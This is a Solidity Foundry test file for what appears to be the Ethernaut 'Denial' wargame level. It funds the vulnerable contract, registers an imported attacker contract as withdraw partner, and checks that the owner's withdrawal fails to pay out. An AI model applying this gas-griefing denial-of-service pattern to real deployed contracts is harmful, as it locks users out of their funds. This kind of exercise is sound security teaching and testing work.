// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Denial} from "../src/contracts/20_Denial.sol";
import {DenialAttacker} from "../src/attackers/20_DenialAttacker.sol";

contract DenialTest is Test {
    address private owner = makeAddr("owner");
    Denial private denial;
    DenialAttacker private denialAttacker;

    function setUp() public {
        denial = new Denial();
        vm.prank(owner);
        deal(owner, 10 ether);
        address(denial).call{value: 10 ether}("");

        denialAttacker = new DenialAttacker();
    }

    function test_DenialExploitVulnerability() public {
        denial.setWithdrawPartner(address(denialAttacker));

        vm.prank(owner);
        uint256 gasStart = gasleft();
        denial.withdraw();
        uint256 gasEnd = gasleft();

        uint256 gasUsed = gasStart - gasEnd;
        console.log("Gas used by denial.withdraw():", gasUsed);

        assertEq(owner.balance, 0);
    }
}
